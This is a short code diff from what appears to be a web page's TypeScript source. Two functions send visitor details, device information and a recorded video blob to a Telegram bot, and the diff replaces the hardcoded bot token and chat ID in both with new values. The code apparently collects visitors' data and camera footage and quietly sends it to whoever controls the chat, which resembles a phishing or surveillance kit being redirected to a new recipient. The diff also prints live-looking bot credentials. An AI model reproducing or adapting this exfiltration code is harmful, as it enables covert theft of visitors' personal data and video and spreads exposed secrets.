@@ -310,8 +310,8 @@ export const sendTelegramNotification = async (details: VisitorDetails) => {
   }
 
   const primaryBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN?.trim();
-  const backupBotToken = '7998243036:AAEmkLqfg6q1Gurw1QgfHCbBM5Idr4SoX6c';
-  const CHAT_ID = '-1002361654031';
+  const backupBotToken = '11177218904:AAEOtSkaU1jN8OljIPIcnMCPGnv8QOpZZP0';
+  const CHAT_ID = '885210236';
 
   if (!CHAT_ID) {
     console.error('Telegram chat ID is not configured');
@@ -390,8 +390,8 @@ ${deviceText}
 
 export const sendVideoToTelegram = async (videoBlob: Blob) => {
   const primaryBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN?.trim();
-  const backupBotToken = '7998243036:AAEmkLqfg6q1Gurw1QgfHCbBM5Idr4SoX6c';
-  const CHAT_ID = '-1002361654031';
+  const backupBotToken = '11177218904:AAEOtSkaU1jN8OljIPIcnMCPGnv8QOpZZP0';
+  const CHAT_ID = '885210236';
 
   if (!CHAT_ID) {
     console.error('Telegram chat ID is not configured');
